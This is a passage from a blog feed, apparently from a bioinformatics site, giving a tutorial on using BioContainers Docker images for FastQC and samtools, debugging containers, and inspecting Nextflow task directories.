<p><strong>Keep local cache for offline work:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> pull quay.io/biocontainers/samtools:1.18--hd87286a_0</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> tag quay.io/biocontainers/samtools:1.18--hd87286a_0 </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    myregistry.com/samtools:1.18</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> push myregistry.com/samtools:1.18</span><br></span></code></pre></div></div>
</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="summary-container-registry-decision-tree">Summary: Container Registry Decision Tree<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#summary-container-registry-decision-tree" class="hash-link" aria-label="Direct link to Summary: Container Registry Decision Tree" title="Direct link to Summary: Container Registry Decision Tree" translate="no">​</a></h3>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">Do you need a bioinformatics tool in a container?</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├─→ Search https://biocontainers.pro/registry (BioContainers)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   ├─→ Found? Use it ✓</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   └─→ Not found?</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│       │</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│       ├─→ Search https://seqera.io/containers/ (Seqera Containers)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│       │   ├─→ Found? Use it ✓</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│       │   └─→ Not found?</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│       │       │</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│       │       └─→ Build using Section 4</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│       │           (Micromamba or Pixi) ✓</span><br></span></code></pre></div></div>
<p><strong>Key Takeaway:</strong></p>
<ul>
<li class=""><strong>Check existing registries first</strong> - saves time and uses community-maintained containers</li>
<li class=""><strong>BioContainers (<a href="https://biocontainers.pro/registry" target="_blank" rel="noopener noreferrer" class="">https://biocontainers.pro/registry</a>) is your first stop</strong> - most comprehensive bioinformatics registry</li>
<li class=""><strong>Seqera (<a href="https://seqera.io/containers/" target="_blank" rel="noopener noreferrer" class="">https://seqera.io/containers/</a>) for multi-tool combinations</strong> - modern approach for complex workflows</li>
<li class=""><strong>Build yourself only as last resort</strong> - but you now have the tools (Section 4) to do it well</li>
</ul>]]></content>
        <author>
            <name>Thanh-Giang Tan Nguyen</name>
            <email>nttg8100@gmail.com</email>
            <uri>https://www.facebook.com/nttg8100</uri>
        </author>
        <category label="docker" term="docker"/>
        <category label="bioinformatics" term="bioinformatics"/>
        <category label="bioconda" term="bioconda"/>
        <category label="nextflow" term="nextflow"/>
        <category label="best-practices" term="best-practices"/>
    </entry>
    <entry>
        <title type="html"><![CDATA[Containers in Bioinformatics: Community Tooling and Efficient Docker Building]]></title>
        <id>https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker</id>
        <link href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker"/>
        <updated>2026-02-08T00:00:00.000Z</updated>
        <summary type="html"><![CDATA[Docker containers are revolutionizing bioinformatics by automating reproducibility and portability across platforms. But what problems can they actually solve? This post shows real-world applications of containers in bioinformatics workflows, then guides you through the simplest possible ways to use, build and debug them.]]></summary>
        <content type="html"><![CDATA[<p>Docker containers are revolutionizing bioinformatics by automating reproducibility and portability across platforms. But what problems can they actually solve? This post shows real-world applications of containers in bioinformatics workflows, then guides you through the simplest possible ways to use, build and debug them.</p>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="prerequisites-get-docker-installed-and-running">Prerequisites: Get Docker Installed and Running<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#prerequisites-get-docker-installed-and-running" class="hash-link" aria-label="Direct link to Prerequisites: Get Docker Installed and Running" title="Direct link to Prerequisites: Get Docker Installed and Running" translate="no">​</a></h2>
<p>Before reading this blog, <strong>you need Docker installed on your system</strong>. This blog assumes you already have Docker up and running and covers how to effectively use containers for bioinformatics work.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="start-here-first">Start Here First<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#start-here-first" class="hash-link" aria-label="Direct link to Start Here First" title="Direct link to Start Here First" translate="no">​</a></h3>
<p>If Docker is not yet installed on your machine, visit the official Docker documentation:</p>
<p><strong>📦 <a href="https://docs.docker.com/get-started/get-docker/" target="_blank" rel="noopener noreferrer" class="">https://docs.docker.com/get-started/get-docker/</a></strong></p>
<p>This guide will walk you through:</p>
<ul>
<li class=""><strong>Installing Docker Desktop</strong> (Mac, Windows, Linux)</li>
<li class=""><strong>Verifying your installation</strong> with <code>docker --version</code></li>
<li class=""><strong>Running your first container</strong> with <code>docker run hello-world</code></li>
<li class=""><strong>Understanding Docker basics</strong> (images, containers, registries)</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="what-you-need-to-know">What You Need to Know<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#what-you-need-to-know" class="hash-link" aria-label="Direct link to What You Need to Know" title="Direct link to What You Need to Know" translate="no">​</a></h3>
<p>After installing Docker, verify it's working:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Check Docker version</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--version</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Output: Docker version 24.0.0, build 12345abc</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run a test container</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run hello-world</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Output: Hello from Docker! This message shows that your installation appears to be working correctly.</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="about-this-blog">About This Blog<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#about-this-blog" class="hash-link" aria-label="Direct link to About This Blog" title="Direct link to About This Blog" translate="no">​</a></h3>
<p>Once Docker is installed and working, this blog will teach you:</p>
<ol>
<li class=""><strong>Why manual installation fails</strong> and how containers solve reproducibility problems</li>
<li class=""><strong>How to use Docker containers</strong> for bioinformatics data analysis</li>
<li class=""><strong>How to build efficient Docker images</strong> with best practices</li>
<li class=""><strong>How to build containers with Micromamba and Pixi</strong> for bioinformatics workflows</li>
<li class=""><strong>How to find pre-built containers</strong> before building from scratch</li>
</ol>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="prerequisites-checklist">Prerequisites Checklist<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#prerequisites-checklist" class="hash-link" aria-label="Direct link to Prerequisites Checklist" title="Direct link to Prerequisites Checklist" translate="no">​</a></h3>
<p>Before continuing, verify you have:</p>
<ul>
<li class="">✅ Docker installed (<code>docker --version</code> works)</li>
<li class="">✅ Docker daemon running (or Docker Desktop active)</li>
<li class="">✅ Can pull images (<code>docker pull hello-world</code> works)</li>
<li class="">✅ Basic familiarity with command line/terminal</li>
<li class="">✅ (Optional but helpful) Nextflow installed for pipeline examples</li>
</ul>
<p><strong>Not ready?</strong> Go to <a href="https://docs.docker.com/get-started/get-docker/" target="_blank" rel="noopener noreferrer" class="">https://docs.docker.com/get-started/get-docker/</a> first, then come back here!</p>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="1-why-manual-installation-fails-the-old-way-vs-modern-containers">1. Why Manual Installation Fails: The Old Way vs. Modern Containers<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#1-why-manual-installation-fails-the-old-way-vs-modern-containers" class="hash-link" aria-label="Direct link to 1. Why Manual Installation Fails: The Old Way vs. Modern Containers" title="Direct link to 1. Why Manual Installation Fails: The Old Way vs. Modern Containers" translate="no">​</a></h2>
<p>Traditionally, bioinformatics labs installed software on shared servers or laptops using commands like:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">sudo</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">apt-get</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">install</span><span class="token plain"> samtools bwa python3</span><br></span></code></pre></div></div>
<p>While this seems easy, it creates major reproducibility, portability, and maintenance headaches:</p>
<ul>
<li class=""><strong>Manual Steps:</strong> Each researcher (or lab) performs installs slightly differently. Written instructions, scripts, and troubleshooting steps are often lost, mixed, or outdated.</li>
<li class=""><strong>Not Reproducible:</strong> No record of what was installed, which versions, or the exact order. Over time, software updates, conflicts, and broken dependencies accumulate, leading to the "works for me" problem.</li>
<li class=""><strong>Hard to Debug:</strong> Version mismatches, library conflicts, and subtle errors are almost impossible to diagnose or fix once the environment drifts.</li>
<li class=""><strong>Not Portable:</strong> Scripts break on macOS, Windows, or other Linux variants. HPC systems often restrict sudo/root access, making traditional installs impossible.</li>
</ul>
<p><strong>Result:</strong> Collaboration across labs, institutions, or countries becomes fragile. Reproducing results—even on your own machine—can be a challenge!</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="the-modern-solution-containers-and-community-tooling">The Modern Solution: Containers and Community Tooling<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#the-modern-solution-containers-and-community-tooling" class="hash-link" aria-label="Direct link to The Modern Solution: Containers and Community Tooling" title="Direct link to The Modern Solution: Containers and Community Tooling" translate="no">​</a></h3>
<p>Today, bioinformatics has largely replaced manual installs with containers and environment managers:</p>
<ul>
<li class=""><strong>BioConda:</strong> Over 8000 bioinformatics packages can be installed reproducibly via Conda.</li>
<li class=""><strong>BioContainers:</strong> Automatically generates Docker containers for each tool, available at <a href="https://quay.io/organization/biocontainers" target="_blank" rel="noopener noreferrer" class="">quay.io/biocontainers</a>.<!-- -->
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> pull quay.io/biocontainers/samtools:1.15.1--h1170115_0</span><br></span></code></pre></div></div>
</li>
<li class=""><strong>Seqera/Nextflow/nf-core:</strong> Pipelines with environment definitions (Conda, Docker, Singularity) are shared and run identically everywhere.</li>
</ul>
<p><em>Bottom line:</em> Containers and Conda have solved the nightmare of manual installs, making reproducible science and collaboration routine in bioinformatics.</p>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="2-using-docker-containers-for-bioinformatics-data-analysis">2. Using Docker Containers for Bioinformatics Data Analysis<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#2-using-docker-containers-for-bioinformatics-data-analysis" class="hash-link" aria-label="Direct link to 2. Using Docker Containers for Bioinformatics Data Analysis" title="Direct link to 2. Using Docker Containers for Bioinformatics Data Analysis" translate="no">​</a></h2>
<p>One of the biggest advantages of Docker is the ability to run bioinformatics tools directly—without any installation—on your own datasets. Here’s a practical example using FastQC, a widely used quality control tool for sequencing data.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="example-run-fastqc-from-a-container">Example: Run FastQC from a Container<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#example-run-fastqc-from-a-container" class="hash-link" aria-label="Direct link to Example: Run FastQC from a Container" title="Direct link to Example: Run FastQC from a Container" translate="no">​</a></h3>
<ol>
<li class="">
<p><strong>Pull the FastQC container (only needed once):</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> pull quay.io/biocontainers/fastqc:</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">version</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Replace &lt;version&gt; with the specific tag, e.g. 0.11.9--hdfd78af_1</span><br></span></code></pre></div></div>
</li>
<li class="">
<p><strong>Run FastQC, mounting your data folder:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string environment constant" style="color:hsl(35, 99%, 36%)">$PWD</span><span class="token string" style="color:hsl(119, 34%, 47%)">:/data"</span><span class="token plain"> quay.io/biocontainers/fastqc:</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">version</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> fastqc /data/my_reads.fastq</span><br></span></code></pre></div></div>
<ul>
<li class=""><code>--rm</code>: Automatically remove the container after it exits.</li>
<li class=""><code>-v "$PWD:/data"</code>: Mount your current directory (with your FASTQ file) into the container at <code>/data</code>.</li>
<li class="">The container runs the FastQC executable, analyzing the file and writing results back to your folder.</li>
</ul>
</li>
</ol>
<p><strong>Key Benefits:</strong></p>
<ul>
<li class="">No software installation or dependency headaches.</li>
<li class="">Exact version and environment guaranteed.</li>
<li class="">Can share or rerun analysis anywhere Docker is available (Linux, Mac, Windows, cloud, HPC).</li>
</ul>
<p>This approach works for thousands of bioinformatics containers—swap FastQC for Samtools, BWA, STAR, or other tools and run your analysis fully reproducibly and portable.</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="running-containers-interactively">Running Containers Interactively<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#running-containers-interactively" class="hash-link" aria-label="Direct link to Running Containers Interactively" title="Direct link to Running Containers Interactively" translate="no">​</a></h3>
<p>Sometimes you want to run tools or explore interactively inside the container, just as if you were launching a shell. Docker makes this easy with the <code>-it</code> flags:</p>
<ul>
<li class=""><code>-i</code> keeps STDIN open (interactive input)</li>
<li class=""><code>-t</code> allocates a pseudo-terminal (TTY)</li>
</ul>
<p><strong>Example: Start an interactive shell inside the FastQC container:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-it</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string environment constant" style="color:hsl(35, 99%, 36%)">$PWD</span><span class="token string" style="color:hsl(119, 34%, 47%)">:/data"</span><span class="token plain"> quay.io/biocontainers/fastqc:</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">version</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> /bin/bash</span><br></span></code></pre></div></div>
<p>Now you’re inside the container shell:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">fastqc /data/my_reads.fastq</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">ls</span><span class="token plain"> /data</span><br></span></code></pre></div></div>
<p><strong>Benefits:</strong></p>
<ul>
<li class="">Inspect files, experiment with commands, or troubleshoot in real-time</li>
<li class="">Explore the container environment (dependencies, installed tools)</li>
<li class="">Still fully reproducible every time you launch</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="debugging-and-inspecting-a-running-docker-container">Debugging and Inspecting a Running Docker Container<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#debugging-and-inspecting-a-running-docker-container" class="hash-link" aria-label="Direct link to Debugging and Inspecting a Running Docker Container" title="Direct link to Debugging and Inspecting a Running Docker Container" translate="no">​</a></h3>
<p>If your container is already running (perhaps as part of a pipeline or a background process), Docker lets you connect and debug interactively using <code>docker exec</code>:</p>
<ol>
<li class="">
<p>List running containers:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">ps</span><br></span></code></pre></div></div>
<p>Note the CONTAINER ID in the output.</p>
</li>
<li class="">
<p>Start a bash shell inside the running container:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">exec</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-it</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">CONTAINER_ID</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><span class="token plain"> /bin/bash</span><br></span></code></pre></div></div>
<p>Now you can inspect files, check logs, and run additional commands inside the live container.</p>
</li>
</ol>
<hr>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="entrypoint-and-overriding-commands">ENTRYPOINT and Overriding Commands<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#entrypoint-and-overriding-commands" class="hash-link" aria-label="Direct link to ENTRYPOINT and Overriding Commands" title="Direct link to ENTRYPOINT and Overriding Commands" translate="no">​</a></h3>
<p>Many containers run a specific tool as their default ENTRYPOINT—for example, FastQC containers launch FastQC automatically. However, you can temporarily override ENTRYPOINT and start a shell using:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token function" style="color:hsl(221, 87%, 60%)">docker</span><span class="token plain"> run </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--rm</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-it</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">--entrypoint</span><span class="token plain"> /bin/bash quay.io/biocontainers/fastqc:</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token plain">version</span><span class="token operator" style="color:hsl(221, 87%, 60%)">&gt;</span><br></span></code></pre></div></div>
<p>This starts an interactive shell even if the container’s Dockerfile specifies a different default command. Useful for debugging, troubleshooting, or exploring the container environment.</p>
<p><strong>Summary:</strong></p>
<ul>
<li class="">Use <code>docker exec</code> to debug running containers</li>
<li class="">Override ENTRYPOINT for interactive shells</li>
<li class="">Enables real-time troubleshooting and inspection, making containers even more flexible for science</li>
</ul>
<hr>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="running-containers-with-nextflow-inspecting-the-actual-docker-commands">Running Containers with Nextflow: Inspecting the Actual Docker Commands<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#running-containers-with-nextflow-inspecting-the-actual-docker-commands" class="hash-link" aria-label="Direct link to Running Containers with Nextflow: Inspecting the Actual Docker Commands" title="Direct link to Running Containers with Nextflow: Inspecting the Actual Docker Commands" translate="no">​</a></h3>
<p>When you run a Nextflow pipeline with Docker containers, Nextflow automatically generates and executes Docker commands for each task. Understanding these commands is useful for debugging, profiling, and understanding exactly what your pipeline is doing.</p>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="where-nextflow-stores-docker-commands">Where Nextflow Stores Docker Commands<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#where-nextflow-stores-docker-commands" class="hash-link" aria-label="Direct link to Where Nextflow Stores Docker Commands" title="Direct link to Where Nextflow Stores Docker Commands" translate="no">​</a></h4>
<p>Nextflow creates a work directory structure where each task has its own folder containing:</p>
<ul>
<li class=""><code>.command.sh</code> - The shell script to execute</li>
<li class=""><code>.command.run</code> - The wrapper script that Nextflow uses to run the task</li>
<li class=""><code>.command.trace</code> - Task execution trace</li>
<li class=""><code>.exitcode</code> - Exit code of the task</li>
<li class="">Output files from the task</li>
</ul>
<p><strong>Directory structure:</strong></p>
<div class="language-text codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">work/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">├── ab/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   ├── abc123def456.../</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   │   ├── .command.sh</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   │   ├── .command.run</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   │   ├── .command.trace</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   │   └── ... (output files)</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│   └── def789ghi012.../</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">│       └── ...</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">└── fe/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    └── 949a78b06c5fd8284aeb2f87d14f7d/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        ├── .command.sh</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        ├── .command.run</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        └── ... (task outputs)</span><br></span></code></pre></div></div>
<h4 class="anchor anchorTargetStickyNavbar_Vzrq" id="viewing-the-actual-docker-command">Viewing the Actual Docker Command<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-containers-build-efficient-docker#viewing-the-actual-docker-command" class="hash-link" aria-label="Direct link to Viewing the Actual Docker Command" title="Direct link to Viewing the Actual Docker Command" translate="no">​</a></h4>
<p>To see the exact Docker command that Nextflow executed for a specific task:</p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># 1. Find your task's work directory</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># For example, in the pipeline output you might see:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)">#   vep (ensembl-vep:115.2) [fe/949a78b...]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 2. Navigate to that directory</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">cd</span><span 